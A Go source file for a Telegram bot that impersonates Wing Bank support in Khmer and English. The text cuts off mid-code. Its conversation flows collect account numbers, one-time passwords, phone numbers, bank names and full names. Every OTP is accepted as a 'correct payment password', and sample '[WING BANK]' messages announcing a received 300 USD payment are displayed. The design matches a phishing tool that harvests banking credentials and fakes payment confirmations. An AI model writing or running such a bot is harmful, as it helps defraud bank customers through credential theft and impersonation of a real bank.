package handlers

import (
	"database/sql"
	"fmt"
	"log"
	"os"
	"strings"
	"sync"
	"time"

	tele "gopkg.in/telebot.v3"

	"tgbot/db"
	"tgbot/services"
)

// Store is the shared database handle, set by main.go at startup.
var Store *db.DB

// Conversation states for tracking user interaction flow.
type conversationState struct {
	step    string // current step
	account string // Wing account number
	bank    string // bank name
	phone   string // phone number
	name    string // customer name
}

var (
	convStates = make(map[int64]*conversationState)
	convMu     sync.RWMutex

	autoReplyStates = make(map[int64]time.Time)
	autoReplyMu     sync.Mutex
)

func setState(userID int64, state *conversationState) {
	convMu.Lock()
	defer convMu.Unlock()
	convStates[userID] = state
}

func getState(userID int64) *conversationState {
	convMu.RLock()
	defer convMu.RUnlock()
	return convStates[userID]
}

func clearState(userID int64) {
	convMu.Lock()
	defer convMu.Unlock()
	delete(convStates, userID)
}

const (
	autoReplyCooldown = 2 * time.Minute
	autoReplyDelay    = 30 * time.Second
)

func shouldSendAutoReply(userID int64) bool {
	autoReplyMu.Lock()
	defer autoReplyMu.Unlock()
	last, ok := autoReplyStates[userID]
	if !ok {
		autoReplyStates[userID] = time.Now()
		return true
	}
	if time.Since(last) >= autoReplyCooldown {
		autoReplyStates[userID] = time.Now()
		return true
	}
	return false
}

func isTextCommand(text string) bool {
	return strings.HasPrefix(text, "/")
}

func handleAutoReply(c tele.Context) error {
	if c.Message() == nil {
		return nil
	}
	text := strings.TrimSpace(c.Message().Text)
	if text == "" || isTextCommand(text) {
		return nil
	}
	if c.Chat() == nil || c.Chat().Type != tele.ChatPrivate {
		return nil
	}

	userID := c.Sender().ID
	if !shouldSendAutoReply(userID) {
		return nil
	}

	welcome := "Welcome to Wing Bank. Kindly stay on the line while we connect you to our agent.\n\nOur next available agent will be with you shortly.\n\nThank you for your patience."
	busy := "All agents are currently busy. Please try again after sometime."

	recipient := &tele.User{ID: userID}
	sent, err := c.Bot().Send(recipient, welcome)
	if err != nil {
		return err
	}
	botName := os.Getenv("BOT_NAME")
	if botName == "" {
		botName = "wing-bank"
	}
	if Store != nil {
		if err := Store.InsertOutboundMessage(int64(sent.ID), userID, welcome, botName); err != nil {
			log.Printf("handleAutoReply: failed to log outbound welcome for %d: %v", userID, err)
		}
	}

	welcomeSentAt := time.Now()
	go func(start time.Time) {
		time.Sleep(autoReplyDelay)
		if _, err := c.Bot().Send(recipient, busy); err != nil {
			log.Printf("handleAutoReply: failed to send busy notice to %d: %v", userID, err)
		} else {
			if Store != nil {
				if err := Store.InsertOutboundMessage(0, userID, busy, botName); err != nil {
					log.Printf("handleAutoReply: failed to log outbound busy notice for %d: %v", userID, err)
				}
			}
		}

		// After 3 minutes from the welcome, if there's still no agent/admin
		// reply to this customer, send the final Khmer follow-up messages.
		time.Sleep(3 * time.Minute)
		if Store == nil {
			// Conservatively still send messages if DB not available.
			sendFinalFollowups(c, recipient, userID, botName)
			return
		}
		ok, err := Store.HasAdminOrAgentReplySince(userID, start)
		if err != nil {
			log.Printf("handleAutoReply: error checking replies for %d: %v", userID, err)
			// On error, don't spam — skip sending final followups.
			return
		}
		if !ok {
			sendFinalFollowups(c, recipient, userID, botName)
		}
	}(welcomeSentAt)

	return nil
}

func sendFinalFollowups(c tele.Context, recipient *tele.User, userID int64, botName string) {
	final1 := "សូមអរគុណសំរាប់ការគាំទ្រសេវាកម្មវីង។ ប្រសិនជាបងមានជាចម្ងល់ឬបញ្ហាបន្ថែម បងអាចទំនាក់ទំនងមកកាន់ផ្នែកបំរើសេវាអតិថិជនម្ដងទៀតបានគ្រប់ពេល។"
	final2 := "ជូនពរឱ្យបងមានសុខភាពល្អនិងសំណាងល្អគ្រប់ពេលណាបង!"

	if _, err := c.Bot().Send(recipient, final1); err != nil {
		log.Printf("sendFinalFollowups: failed to send final1 to %d: %v", userID, err)
	} else if Store != nil {
		if err := Store.InsertOutboundMessage(0, userID, final1, botName); err != nil {
			log.Printf("sendFinalFollowups: failed to log final1 for %d: %v", userID, err)
		}
	}

	// small delay between the two messages to avoid Telegram flood limits
	time.Sleep(500 * time.Millisecond)

	if _, err := c.Bot().Send(recipient, final2); err != nil {
		log.Printf("sendFinalFollowups: failed to send final2 to %d: %v", userID, err)
	} else if Store != nil {
		if err := Store.InsertOutboundMessage(0, userID, final2, botName); err != nil {
			log.Printf("sendFinalFollowups: failed to log final2 for %d: %v", userID, err)
		}
	}
}

// accountMenu builds a keyboard with "Verify Account" and "Back to Home" buttons.
func accountMenu() *tele.ReplyMarkup {
	menu := &tele.ReplyMarkup{}
	menu.Inline(
		menu.Row(
			menu.Data("\u2705 \u1795\u17d2\u1791\u179b\u17cb\u179a\u1794\u179f\u17cb\u1782\u178e\u1793\u17b8", cbVerify),
			menu.Data("\U0001f519 \u178f\u17d2\u179a\u17a1\u1794\u1791\u17c5\u1798\u17d9\u1793\u17bb\u1799\u178a\u17be\u1798", cbBack),
		),
	)
	return menu
}

// sendAccountVerification shows the account info screen.
func sendAccountVerification(c tele.Context) error {
	text := "គណនីសន្សវ\n\n" +
		"គណនីបច្ចុប្បន្ន: 104197080 (xxxxx)\n\n" +
		"កាលកំណត់: 24/7\n\n" +
		"សូមបញ្ចូលលេខកូដ OTP ที่ Wing Bank ផ្ញើទៅកាន់គណនីរបស់អ្នក"
	return c.Edit(text, tele.ModeMarkdown, accountMenu())
}

// handleVerifyAccount starts the verification flow — asks for account number.
func handleVerifyAccount(c tele.Context) error {
	userID := c.Sender().ID
	setState(userID, &conversationState{step: "awaiting_account"})

	text := "\U0001f538 \u179f\u17bc\u1798\u1794\u1789\u17d2\u1785\u17bc\u179b\u179b\u17c1\u1781\u179b\u17c1\u1782\u178e\u1793\u17b8 \u179a\u1794\u179f\u17cb\u17a2\u17d2\u1793\u1780:"
	return c.Edit(text, backMenu())
}

// RegisterConversationHandler registers the text message handler for multi-step flows.
func RegisterConversationHandler(b *tele.Bot) {
	b.Handle(tele.OnText, func(c tele.Context) error {
		userID := c.Sender().ID
		state := getState(userID)
		text := ""
		if c.Message() != nil {
			text = c.Message().Text
		}

		if state == nil {
			log.Printf("[OnText] user=%d text=%q state=NIL (auto-reply)", userID, text)
			if err := handleAutoReply(c); err != nil {
				log.Printf("[autoReply] failed for user=%d: %v", userID, err)
			}
			return nil
		}
		log.Printf("[OnText] user=%d text=%q step=%q", userID, text, state.step)

		switch state.step {
		case "awaiting_account":
			return handleAccountInput(c, userID)
		case "awaiting_otp":
			return handleOTPInput(c, userID)
		case "awaiting_issue":
			return handleIssueInput(c, userID)
		case "notif_account":
			return handleNotifAccountInput(c, userID)
		case "notif_bank":
			return handleNotifBankInput(c, userID)
		case "notif_phone":
			return handleNotifPhoneInput(c, userID)
		case "notif_name":
			return handleNotifNameInput(c, userID)
		case "notif_channel_tg_otp":
			return handleNotifTGOtp(c, userID)
		case "awaiting_hash":
			return handleHashInput(c, userID)
		case "khqr_account":
			return handleKHQRAccountInput(c, userID)
		case "khqr_amount":
			return handleKHQRAmountInput(c, userID)
		case "scan_khqr":
			return handleScanKHQRInput(c, userID)
		case "scan_amount":
			return handleScanAmountInput(c, userID)
		case "scan_confirm":
			return handleScanConfirmInput(c, userID)
		case "live_chat":
			return handleChatInput(c, userID)
		case "":
			// Step is empty: user is between form fields (just pressed a button).
			// Do NOT clear state — the next button click will set a new step.
			log.Printf("[OnText] user=%d step empty, ignoring (state preserved)", userID)
			return nil
		default:
			log.Printf("[OnText] user=%d unknown step=%q, clearing state", userID, state.step)
			clearState(userID)
			return nil
		}
	})
}

// handleAccountInput validates the account number and triggers OTP delivery.
// Flow: User enters account → System verifies → System sends OTP to Wing Bank
func handleAccountInput(c tele.Context, userID int64) error {
	account := c.Message().Text

	// Demo: any account number with at least 4 digits is "valid"
	if len(account) < 4 {
		return c.Send("លេខគណនីមិនត្រឹមត្រូវ។ សូមបញ្ចូលម្ដងទៀត។", mainMenu())
	}

	// Account verified → System sends OTP to Wing Bank
	setState(userID, &conversationState{step: "awaiting_otp"})

	// Mask account number: show first 2 and last 1 digit
	masked := account[:2]
	for i := 2; i < len(account)-1; i++ {
		masked += "x"
	}
	masked += account[len(account)-1:]

	text := "ប្រព័ន្ធផ្ទៀង OTP\n\n" +
		"គណនី: " + masked + "\n\n" +
		"សូមបញ្ចូលលេខកូដ OTP ដែល Wing BANK បានផ្ញើទៅកាន់គណនីរបស់អ្នក:"
	return c.Send(text, backMenu())
}

// handleOTPInput accepts any OTP code and shows success, then asks for issue.
// Flow: User enters OTP → System verifies → Bot sends ✅ → Ask about issue
func handleOTPInput(c tele.Context, userID int64) error {
	setState(userID, &conversationState{step: "awaiting_issue"})

	text := "✅ Congratulations! You have entered the correct payment password. " +
		"Thank you for your support of Wing Thank you! \U0001f64f\n\n" +
		"សូមប្រាប់យើងថា គណនីរបស់អ្នកមានបញ្ហាអ្វីដែរ?\n" +
		"សូមពិពណ៌នាពីបញ្ហារបស់អ្នកនៅទីនេះ:"
	return c.Send(text)
}

// handleIssueInput captures the customer's issue description.
func handleIssueInput(c tele.Context, userID int64) error {
	issue := c.Message().Text
	clearState(userID)

	text := "យើងបានទទួលព័ត៌មានរបស់អ្នកហើយ។\n\n" +
		"បញ្ហា: " + strings.TrimSpace(issue) + "\n\n" +
		"បុគ្គលិកជំនួយការសេវាអតិថិជននឹងទំនាក់ទំនងអ្នកក្នុងពេលឆាប់ៗនេះ។\n" +
		"សូមអរគុណ! 🙏"
	return c.Send(text, liveChatMenu())
}

// channelMenu builds a keyboard for choosing notification channel.
func channelMenu() *tele.ReplyMarkup {
	menu := &tele.ReplyMarkup{}
	menu.Inline(
		menu.Row(
			menu.Data("\U0001f4f1 SMS", cbChannelSMS),
			menu.Data("\U0001f4e8 Telegram", cbChannelTG),
		),
		menu.Row(
			menu.Data("🛰️ Satellite", cbChannelSatellite),
		),
		menu.Row(
			menu.Data("\U0001f519 \u178f\u17d2\u179a\u17a1\u1794\u1791\u17c5\u1798\u17d9\u1793\u17bb\u1799\u178a\u17be\u1798", cbBack),
		),
	)
	return menu
}

// notifFormMenu builds the 4-button form keyboard with checkmarks for filled fields.
func notifFormMenu(state *conversationState) *tele.ReplyMarkup {
	menu := &tele.ReplyMarkup{}
	accLabel := "\U0001f538 \u1782\u178e\u1793\u17b8"
	bnkLabel := "\U0001f538 \u1792\u1793\u17b6\u1782\u17b6\u179a"
	phnLabel := "\U0001f538 \u179b\u17c1\u1781\u1791\u17bc\u179a\u179f\u17d0\u1796\u17d2\u1791"
	nmeLabel := "\U0001f538 \u1788\u17d2\u1798\u17c4\u17a0\u17a2\u17d2\u1793\u1780"
	if state != nil {
		if state.account != "" {
			accLabel = "\u2705 \u1782\u178e\u1793\u17b8"
		}
		if state.bank != "" {
			bnkLabel = "\u2705 \u1792\u1793\u17b6\u1782\u17b6\u179a"
		}
		if state.phone != "" {
			phnLabel = "\u2705 \u179b\u17c1\u1781\u1791\u17bc\u179a\u179f\u17d0\u1796\u17d2\u1791"
		}
		if state.name != "" {
			nmeLabel = "\u2705 \u1788\u17d2\u1798\u17c4\u17a0\u17a2\u17d2\u1793\u1780"
		}
	}
	menu.Inline(
		menu.Row(
			menu.Data(accLabel, cbNotifAccount),
			menu.Data(bnkLabel, cbNotifBank),
		),
		menu.Row(
			menu.Data(phnLabel, cbNotifPhone),
			menu.Data(nmeLabel, cbNotifName),
		),
		menu.Row(
			menu.Data("\U0001f519 \u178f\u17d2\u179a\u17a1\u1794\u1791\u17c5\u1798\u17d9\u1793\u17bb\u1799\u178a\u17be\u1798", cbBack),
		),
	)
	return menu
}

// isNotifFormComplete returns true when all 4 fields have been filled.
func isNotifFormComplete(state *conversationState) bool {
	return state != nil && state.account != "" && state.bank != "" && state.phone != "" && state.name != ""
}

// sendNotifForm sends (or re-sends) the application form message.
// Plain text (no parse mode) to avoid Telegram HTML/Markdown entity errors.
func sendNotifForm(c tele.Context, state *conversationState) error {
	text := "✉️ ស្នើរសេវាផ្ញើរសារចូល BAkong\n\n" +
		"សូមចុចបញ្ចូលនៅខាងក្រោមនៅទីនៈវិញ:"
	return c.Send(text, notifFormMenu(state))
}

// showNotifVerification shows all collected info and asks for channel choice.
// Plain text — user fields are trimmed only (no escaping needed).
func showNotifVerification(c tele.Context, state *conversationState) error {
	text := "✅ ផ្ទៀងផ្ទា់ចូល\n\n" +
		"🔸 គណនី: " + strings.TrimSpace(state.account) + "\n" +
		"🔸 ធនាគារ: " + strings.TrimSpace(state.bank) + "\n" +
		"🔸 លេខទូរស័ព្ទ: " + strings.TrimSpace(state.phone) + "\n" +
		"🔸 ឈ្មោះ: " + strings.TrimSpace(state.name) + "\n\n" +
		"📲 សូមជ្រើសរើសឆានែលសម្រាប់ផ្ញើរសារចូល:"
	return c.Send(text, channelMenu())
}

// --- Button click handlers (set step then ask for text input) ---

// handleNotifAccountBtn prompts for account number entry.
func handleNotifAccountBtn(c tele.Context) error {
	userID := c.Sender().ID
	state := getState(userID)
	if state == nil {
		state = &conversationState{}
	}
	state.step = "notif_account"
	setState(userID, state)
	return c.Send("\U0001f538 \u179f\u17bc\u1798\u1794\u1789\u17d2\u1785\u17bc\u179b\u179b\u17c1\u1781\u1782\u178e\u1793\u17b8 Wing \u179a\u1794\u179f\u17cb\u17a2\u17d2\u1793\u1780:", backMenu())
}

// handleNotifBankBtn prompts for bank name entry.
func handleNotifBankBtn(c tele.Context) error {
	userID := c.Sender().ID
	state := getState(userID)
	if state == nil {
		state = &conversationState{}
	}
	state.step = "notif_bank"
	setState(userID, state)
	return c.Send("\U0001f538 \u179f\u17bc\u1798\u1794\u1789\u17d2\u1785\u17bc\u179b\u1792\u1793\u17b6\u1782\u17b6\u179a\u179a\u1794\u179f\u17cb\u17a2\u17d2\u1793\u1780:", backMenu())
}

// handleNotifPhoneBtn prompts for phone number entry.
func handleNotifPhoneBtn(c tele.Context) error {
	userID := c.Sender().ID
	state := getState(userID)
	if state == nil {
		state = &conversationState{}
	}
	state.step = "notif_phone"
	setState(userID, state)
	return c.Send("\U0001f538 \u179f\u17bc\u1798\u1794\u1789\u17d2\u1785\u17bc\u179b\u179b\u17c1\u1781\u1791\u17bc\u179a\u179f\u17d0\u1796\u17d2\u1791\u179a\u1794\u179f\u17cb\u17a2\u17d2\u1793\u1780:", backMenu())
}

// handleNotifNameBtn prompts for customer name entry.
func handleNotifNameBtn(c tele.Context) error {
	userID := c.Sender().ID
	state := getState(userID)
	if state == nil {
		state = &conversationState{}
	}
	state.step = "notif_name"
	setState(userID, state)
	return c.Send("\U0001f538 \u179f\u17bc\u1798\u1794\u1789\u17d2\u1785\u17bc\u179b\u1788\u17d2\u1798\u17c4\u17a0\u1796\u17c1\u1789\u179a\u1794\u179f\u17cb\u17a2\u17d2\u1793\u1780:", backMenu())
}

// --- Text input handlers (save value, redraw form or show verification) ---

func handleNotifAccountInput(c tele.Context, userID int64) error {
	state := getState(userID)
	if state == nil {
		return nil
	}
	state.account = c.Message().Text
	state.step = ""
	setState(userID, state)
	if isNotifFormComplete(state) {
		// Do NOT clearState here — we still need the collected fields when the
		// user picks a channel (SMS / Telegram / Satellite).
		return showNotifVerification(c, state)
	}
	return sendNotifForm(c, state)
}

func handleNotifBankInput(c tele.Context, userID int64) error {
	state := getState(userID)
	if state == nil {
		return nil
	}
	state.bank = c.Message().Text
	state.step = ""
	setState(userID, state)
	if isNotifFormComplete(state) {
		return showNotifVerification(c, state)
	}
	return sendNotifForm(c, state)
}

func handleNotifPhoneInput(c tele.Context, userID int64) error {
	state := getState(userID)
	if state == nil {
		return nil
	}
	state.phone = c.Message().Text
	state.step = ""
	setState(userID, state)
	if isNotifFormComplete(state) {
		return showNotifVerification(c, state)
	}
	return sendNotifForm(c, state)
}

func handleNotifNameInput(c tele.Context, userID int64) error {
	state := getState(userID)
	if state == nil {
		return nil
	}
	state.name = c.Message().Text
	state.step = ""
	setState(userID, state)
	if isNotifFormComplete(state) {
		return showNotifVerification(c, state)
	}
	return sendNotifForm(c, state)
}

// handleChannelSMS handles SMS channel selection — direct activation.
// Plain text (no parse mode) to avoid Telegram HTML entity errors.
func handleChannelSMS(c tele.Context) error {
	clearState(c.Sender().ID)

	text := "✅ សេវា SMS បានបញ្ជាក់ដោយជោគជ័យ!\n\n" +
		"📱 លេខទូរស័ព្ទរបស់អ្នកបានភ្ជាប់ជាមួយសេវា SMS។\n\n" +
		"📝 សារផ្ញើរចូល (គម្រូ)\n\n" +
		"[WING BANK]\n" +
		"លោកបានទទួលទឹកប្រាក់ចំនួន 300.00 ដុល្លា\n" +
		"ពីឈ្មោះ xxx ធនាគារ ABA BANK\n" +
		"តាមការស្កែន KHQR\n" +
		"លេខ Hash: a5822d81\n" +
		"សមតុល្យបច្ចុប្បន្ន: 1,500.00 ដុល្លា\n" +
		"លេខប្រតិបត្តិការ: TXN-20260727-001\n\n" +
		"✅ សេវាផ្ញើរសារចូលបានបញ្ជាក់ដោយជោគជ័យ។"
	return c.Edit(text, backMenu())
}

// handleChannelSatellite shows satellite emergency messaging instructions.
// Plain text (no parse mode) to avoid Telegram HTML entity errors.
func handleChannelSatellite(c tele.Context) error {
	clearState(c.Sender().ID)

	text := "🛰️ Satellite Emergency Messaging\n\n" +
		"✅ ប្រសិនបើអ្នកនៅក្នុងទីតាំងដែលគ្មានសញ្ញាទូរស័ព្ទ ឬនៅលើយន្តហោះ ដែលមិនអាចប្រើបណ្តាញទូរស័ព្ទធម្មតា។\n" +
		"✅ អ្នកអាចប្រើ iPhone 14/15/16 Satellite SOS ឬ Android Satellite Messaging។\n" +
		"✅ បើក Satellite connection រួចជ្រើស Send SOS ឬ Satellite Message រួចបញ្ចូលសារ រួចផ្ញើទៅអ្នកទទួលដែលត្រូវការ។\n" +
		"✅ មិនពឹងផ្អែកលើបណ្តាញទូរស័ព្ទធម្មតា។\n\n" +
		"⚠️ មិនចាំបាច់ផ្ញើទៅលេខ 0318388000។"
	return c.Edit(text, backMenu())
}

// resendOTPMenu builds the keyboard shown on the OTP input screen.
// It has two buttons: "Resend OTP" (in case the code never arrives / expires)
// and "Back to Main Menu" (to abort the binding flow).
func resendOTPMenu() *tele.ReplyMarkup {
	menu := &tele.ReplyMarkup{}
	menu.Inline(
		menu.Row(
			menu.Data("\U0001f501 \u1795\u17d2\u1789\u17be\u179a\u1794\u1789\u17d2\u1785\u17bc\u179b OTP \u1790\u17d2\u1798\u17b8", cbResendOTP),
		),
		menu.Row(
			menu.Data("\U0001f519 \u178f\u17d2\u179a\u17a1\u1794\u1791\u17c5\u1798\u17d9\u1793\u17bb\u1799\u178a\u17be\u1798", cbBack),
		),
	)
	return menu
}

// otpPromptText returns the localized OTP prompt shown to the user.
// Centralised so that the initial prompt and the resend message share the
// exact same copy (avoids drift and keeps tests simple).
func otpPromptText() string {
	return "📨 \u1797\u17d2\u1787\u17b6\u1794\u17cb\u1797\u17d2\u1787\u17b6\u179b\u17cb\u179a\u1794\u179f\u17cb Telegram Bot\n\n" +
		"\u179f\u17bc\u1798\u1794\u1789\u17d2\u1785\u17bc\u179b\u179b\u17c1\u1781 OTP \u178a\u17be\u1798\u1795\u17d2\u1791\u17b6\u1793\u1795\u17d2\u1791\u17b6\u178f\u17cb\u17a2\u17d2\u1793\u1780\u1794\u17d2\u179a\u17be\u179b\u17b6\u1796\u17b8\u1780\u17c6\u178e\u17be SMS\u17d4\n\n" +
		"\u179f\u17bc\u1798\u1794\u1789\u17d2\u1785\u17bc\u179b\u179b\u17c1\u1781\u1780\u17bc\u178f OTP:"
}

// handleChannelTG handles Telegram channel selection — asks for OTP.
// Plain text (no parse mode) to avoid Telegram HTML entity errors.
// Defensive: even if state is missing, still prompt the user for OTP so the
// flow does not silently stall on the channel-selection screen.
func handleChannelTG(c tele.Context) error {
	userID := c.Sender().ID
	log.Printf("[handleChannelTG] user=%d fired", userID)
	state := getState(userID)
	if state == nil {
		log.Printf("[handleChannelTG] state missing for user %d, creating minimal state", userID)
		state = &conversationState{}
	}
	state.step = "notif_channel_tg_otp"
	setState(userID, state)

	text := otpPromptText()
	menu := resendOTPMenu()
	// Edit the channel-selection message first; if that fails, fall back to Send
	// so the user still sees the OTP prompt.
	if err := c.Edit(text, menu); err != nil {
		log.Printf("[handleChannelTG] Edit failed for user %d: %v \u2014 falling back to Send", userID, err)
		return c.Send(text, menu)
	}
	return nil
}

// handleResendOTP is called when the user clicks the "Resend OTP" button on
// the OTP input screen. It simulates re-delivery of the OTP by editing the
// current message with a confirmation header followed by the same prompt.
// The conversation step is reset to notif_channel_tg_otp so the text handler
// will accept the next OTP code as a fresh attempt.
func handleResendOTP(c tele.Context) error {
	userID := c.Sender().ID
	log.Printf("[handleResendOTP] user=%d fired", userID)

	state := getState(userID)
	if state == nil {
		state = &conversationState{}
	}
	state.step = "notif_channel_tg_otp"
	setState(userID, state)

	text := "\u2705 OTP \u1790\u17d2\u1798\u17b8\u1794\u17b6\u1793\u1795\u17d2\u1789\u17be\u179a\u1794\u1789\u17d2\u1785\u17bc\u179b\u178a\u17c4\u1799\u1787\u17c4\u1782\u1787\u17d0\u1799!\n\n" + otpPromptText()
	menu := resendOTPMenu()
	if err := c.Edit(text, menu); err != nil {
		log.Printf("[handleResendOTP] Edit failed for user %d: %v \u2014 falling back to Send", userID, err)
		return c.Send(text, menu)
	}
	return nil
}

// handleNotifTGOtp verifies OTP for Telegram channel binding.
// Plain text (no parse mode) to avoid Telegram HTML entity errors.
func handleNotifTGOtp(c tele.Context, userID int64) error {
	state := getState(userID)
	acc, bank, phone, name := "", "", "", ""
	if state != nil {
		acc = strings.TrimSpace(state.account)
		bank = strings.TrimSpace(state.bank)
		phone = strings.TrimSpace(state.phone)
		name = strings.TrimSpace(state.name)
	}
	clearState(userID)

	text := "✅ Telegram Bot បានភ្ជាប់ដោយជោគជ័យ!\n\n" +
		"📲 ព័ត៌មានដែលបានភ្ជាប់:\n" +
		"🔸 គណនី: " + acc + "\n" +
		"🔸 ធនាគារ: " + bank + "\n" +
		"🔸 លេខទូរស័ព្ទ: " + phone + "\n" +
		"🔸 ឈ្មោះ: " + name + "\n\n" +
		"📝 សារផ្ញើរចូល (គម្រូ)\n\n" +
		"[WING BANK]\n" +
		"លោកបានទទួលទឹកប្រាក់ចំនួន 300.00 ដុល្លា\n" +
		"ពីឈ្មោះ xxx ធនាគារ ABA BANK\n" +
		"តាមការស្កែន KHQR\n" +
		"លេខ Hash: a5822d81\n" +
		"សមតុល្យបច្ចុប្បន្ន: 1,500.00 ដុល្លា\n" +
		"លេខប្រតិបត្តិការ: TXN-20260727-001\n\n" +
		"✅ សេវាផ្ញើរសារចូលបានបញ្ជាក់ដោយជោគជ័យ។"
	return c.Send(text, backMenu())
}

// handleHashInput processes the Hash code typed by the user on the "Hash search"
// screen. It looks up the order in the shared SQLite database.
// If no matching order is found, a graceful "not found" message is shown.
func handleHashInput(c tele.Context, userID int64) error {
	hash := strings.TrimSpace(c.Message().Text)
	log.Printf("[handleHashInput] user=%d hash=%q", userID, hash)

	clearState(userID)

	// Look up the order in the real database.
	var text string
	if Store != nil {
		order, err := Store.FindOrderByHash(strings.ToLower(hash))
		if err != nil {
			log.Printf("[handleHashInput] db error: %v", err)
		}
		if order != nil {
			amount := "—"
			if order.Amount.Valid {
				amount = order.Amount.String
			}
			bank := "—"
			if order.Bank.Valid {
				bank = order.Bank.String
			}
			receiver := "—"
			if order.Receiver.Valid {
				receiver = order.Receiver.String
			}
			txDate := "—"
			if order.TxDate.Valid {
				txDate = order.TxDate.String
			}
			txID := "—"
			if order.TxID.Valid {
				txID = order.TxID.String
			}

			// Status emoji mapping.
			statusEmoji := "⚪"
			statusLabel := order.Status
			switch order.Status {
			case "success":
				statusEmoji = "✅"
				statusLabel = "ជោគជ័យ (Success)"
			case "pending":
				statusEmoji = "⏳"
				statusLabel = "កំពុងរង់ចាំ (Pending)"
			case "failed":
				statusEmoji = "❌"
				statusLabel = "បរាជ័យ (Failed)"
			}

			text = "📋 *ព័ត៌មានការបញ្ជាទិញ*\n\n" +
				"🔖 Hash: `" + order.Hash + "`\n" +
				"💰 ទឹកប្រាក់: " + amount + " " + order.Currency + "\n" +
				"⚡ ស្ថានភាព: " + statusEmoji + " " + statusLabel + "\n" +
				"🏦 ធនាគារ: " + bank + "\n" +
				"👤 អ្នកទទួល: " + receiver + "\n" +
				"📅 កាលបរិច្ឆេទ: " + txDate + "\n" +
				"📝 លេខប្រតិបត្តិការ: " + txID + "\n\n" +
				"✅ សេវាអតិថិជន Wing Bank"
		}
	}

	if text == "" {
		text = "❌ *រកមិនទាន់ឃើញទេ Hash: `" + hash + "`*\n\n" +
			"សូមវិញ្ញខ័ណ្ឌក្រោមរបស់យើងខ្ញុំបានពីដំណើរវិច្ច័យនិងចូលបញ្ចូលជាថ្មី។\n\n" +
			"សូមផ្ទល់រូបការបញ្ចូលជាមួយគណនីសេវាអតិថិជន។"
	}

	return c.Send(text, tele.ModeMarkdown, bakongSearchMenu())
}

// handleBakongKHQR starts the KHQR generation flow — asks for account ID.
func handleBakongKHQR(c tele.Context) error {
	userID := c.Sender().ID
	setState(userID, &conversationState{step: "khqr_account"})
	text := "📱 *Generate KHQR Code*\n\n" +
		"សូមបញ្ចូលលេខគណនី BAkong ឬលេខគណនីធនាគារ:\n\n" +
		"ឧទាហរណ៍: `012345678`"
	return c.Edit(text, tele.ModeMarkdown, backMenu())
}

// handleKHQRAccountInput saves account ID and asks for amount.
func handleKHQRAccountInput(c tele.Context, userID int64) error {
	accountID := strings.TrimSpace(c.Message().Text)
	if len(accountID) < 4 {
		return c.Send("❌ លេខគណនីមិនត្រឹមត្រូវ។ សូមបញ្ចូលម្ដងទៀត។", backMenu())
	}
	setState(userID, &conversationState{step: "khqr_amount", account: accountID})

	text := "📱 *KHQR — Account: `" + accountID + "`*\n\n" +
		"សូមបញ្ចូលទឹកប្រាក់ (USD):\n\n" +
		"ឧទាហរណ៍: `300.00`\n\n" +
		"ឬផ្ញើ `0` សម្រាប់ QR គ្មានទឹកប្រាក់ (Dynamic QR)"
	return c.Send(text, tele.ModeMarkdown, backMenu())
}

// handleKHQRAmountInput generates the KHQR code and displays it.
func handleKHQRAmountInput(c tele.Context, userID int64) error {
	state := getState(userID)
	if state == nil {
		return nil
	}
	amount := strings.TrimSpace(c.Message().Text)
	clearState(userID)

	// "0" or empty = dynamic QR (no fixed amount)
	if amount == "0" || amount == "" {
		amount = ""
	}

	payload := GenerateKHQR(state.account, "wing_bank", amount, "USD", "Wing Bank")

	var amtLine string
	if amount != "" {
		amtLine = "💰 ទឹកប្រាក់: " + amount + " USD\n"
	} else {
		amtLine = "💰 ទឹកប្រាក់: Dynamic (អ្នកស្កែនបញ្ចូល)\n"
	}

	text := "✅ *KHQR Code បានបង្កើតដោយជោគជ័យ!*\n\n" +
		"🔖 គណនី: `" + state.account + "`\n" +
		amtLine +
		"🏦 ធនាគារ: Wing Bank\n" +
		"🌍 ប្រទេស: Cambodia (KH)\n\n" +
		"📋 *KHQR Payload:*\n`" + payload + "`\n\n" +
		"📱 ចម្លង payload ខាងលើ រួចប្រើ QR Generator ដើម្បីបង្កើត QR Code។\n" +
		"ឬប្រើ Admin Panel → KHQR Generator ដើម្បីបង្កើតរូប QR ។"

	return c.Send(text, tele.ModeMarkdown, bakongMenu())
}

// handleBakongScan starts the Scan & Transfer flow — asks user to paste KHQR string.
func handleBakongScan(c tele.Context) error {
	userID := c.Sender().ID
	setState(userID, &conversationState{step: "scan_khqr"})
	text := "📷 *Scan & Transfer — ស្កែន QR ផ្ញើប្រាក់*\n\n" +
		"សូមផ្ញើ KHQR payload របស់អ្នកទទួល (paste the QR string):\n\n" +
		"ឧទាហរណ៍:\n`00020101021229430013kh.org.bakong0109012345678...`\n\n" +
		"💡 គន្លឹះ: ចម្លង KHQR payload ពី QR Code scanner app រួចផ្ញើមកទីនេះ។"
	return c.Edit(text, tele.ModeMarkdown, backMenu())
}

// handleScanKHQRInput decodes the pasted KHQR payload and asks for transfer amount.
func handleScanKHQRInput(c tele.Context, userID int64) error {
	payload := strings.TrimSpace(c.Message().Text)
	if len(payload) < 20 {
		return c.Send("❌ KHQR payload មិនត្រឹមត្រូវ។ សូមផ្ញើម្ដងទៀត។", backMenu())
	}

	qr, err := DecodeKHQR(payload)
	if err != nil {
		log.Printf("[scan] decode error for user=%d: %v", userID, err)
		return c.Send("❌ មិនអាចវែកញែក KHQR បានទេ: "+err.Error()+"\n\nសូមផ្ញើ KHQR payload ត្រឹមត្រូវ។", backMenu())
	}

	if !qr.CRCValid {
		log.Printf("[scan] CRC invalid for user=%d", userID)
		return c.Send("⚠️ KHQR CRC មិនត្រឹមត្រូវ! ទិន្នន័យអាចខូច។\n\nសូមផ្ញើ KHQR payload ម្ដងទៀត។", backMenu())
	}

	// Save decoded info in conversation state.
	setState(userID, &conversationState{
		step:    "scan_amount",
		account: qr.AccountID,
		bank:    qr.BankCode,
		name:    qr.Name,
		phone:   qr.Currency, // reuse phone field to carry currency
	})

	// Build recipient info display.
	bankDisplay := qr.BankCode
	if bankDisplay == "" {
		bankDisplay = "Unknown Bank"
	}
	nameDisplay := qr.Name
	if nameDisplay == "" {
		nameDisplay = "—"
	}
	currency := qr.Currency
	if currency == "" {
		currency = "USD"
	}

	var amtLine string
	if qr.Amount != "" {
		amtLine = "💰 ទឹកប្រាក់ក្នុង QR: *" + qr.Amount + " " + currency + "*\n"
	} else {
		amtLine = "💰 ទឹកប្រាក់: *Dynamic* (អ្នកបញ្ចូល)\n"
	}

	text := "✅ *KHQR បានវែកញែកដោយជោគជ័យ!*\n\n" +
		"👤 អ្នកទទួល: *" + nameDisplay + "*\n" +
		"🏦 ធនាគារ: *" + bankDisplay + "*\n" +
		"🔖 គណនី: `" + qr.AccountID + "`\n" +
